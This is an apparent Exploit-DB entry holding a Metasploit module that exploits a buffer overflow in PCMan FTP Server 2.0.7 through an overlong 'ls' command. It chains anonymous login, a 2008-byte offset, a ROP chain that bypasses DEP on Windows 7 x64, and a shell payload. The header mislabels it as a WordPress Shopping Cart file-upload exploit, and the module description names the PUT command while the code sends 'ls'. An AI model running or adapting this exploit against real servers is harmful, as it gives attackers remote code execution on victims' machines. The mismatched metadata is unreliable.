=begin
# Exploit Title: WordPress Shopping Cart 3.0.4 Unrestricted File Upload
# Date: 22-06-2016
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Exploit Author: quanyechavshuo
# Contact: quanyechavshuo@gmail.com
# Website: http://xinghuacai.github.io
# Category: ftp remote exploit

1. Description
this is another bug of pcmanftp which can be used to get a remote shell,and fits well with win7x64 with dep open,refer from
    https://www.exploit-db.com/exploits/39662/

use anonymous and any password to login the ftp remotely,then send a command "ls AAA...A"(9000),the pcmanftp will crashed,later,find the 2009-2012th "A" will replace the pcmanftp's retn address

=end

##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##

    require 'msf/core'

    class Metasploit3 < Msf::Exploit::Remote
      Rank = NormalRanking

      include Msf::Exploit::Remote::Ftp

      def initialize(info = {})
        super(update_info(info,
          'Name'           => 'PCMAN FTP Server Buffer Overflow - ls Command',
          'Description'    => %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          'Author'         =>
              [
                'quanyechavshuo'
              ],
          'License'        => MSF_LICENSE,
          'References'     =>
            [
              [ 'EDB',   '39662'],
              [ 'OSVDB',   'N/A']
            ],
          'DefaultOptions' =>
            {
              'EXITFUNC' => 'process'
            },
          'Payload'        =>
            {
              'Space'   => 1000,
              'BadChars'  => "\x00\x0A\x0D",
            },
          'Platform'       => 'win',
          'Targets'        =>
            [
              [ 'windows 7 x64 chinese',
                {
                #'Ret' => 0x77636aeb, #dont need ret here in win7
                  'Offset' => 2008
                }
              ],
            ],
          'DisclosureDate' => 'Aug 07 2015',
          'DefaultTarget'  => 0))
      end

      def check
        connect_login
        disconnect

        if /220 PCMan's FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll]
      0x41414141,  # add a 4 bytes data to fit retn 0x4 from the last function's retn before eip=rop_gadgets
      0x73c112d0,  # ptr to &VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll]
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll]
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll]
      0x74916f14,  # & push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll]
      0xfffffaff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll]
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll]
      0x77031d7b,  # POP EAX # RETN [kernel32.dll]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll]
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll]
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll]
      0x7647c663,  # &Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll]
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll]
      0x90909090,  # nop
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll]

    ].flatten.pack("V*")

    return rop_gadgets

  end


      def exploit
        connect_login

        print_status('Generating payload...')
        sploit = rand_text_alpha(target['Offset'])

        #tmp = sploit
        #print_status(tmp)
        sploit << create_rop_chain()
        #sploit << make_nops(9) 这句产生的nop并非90
        sploit << "\x90"*30
        #sploit << "\x41"*30
        #sploit << "\xcc"
        sploit << payload.encoded

        #tmp=sploit
        tmp=make_nops(9)
        print_status(tmp)

        send_cmd( ["ls", sploit], false )
        disconnect
      end

    end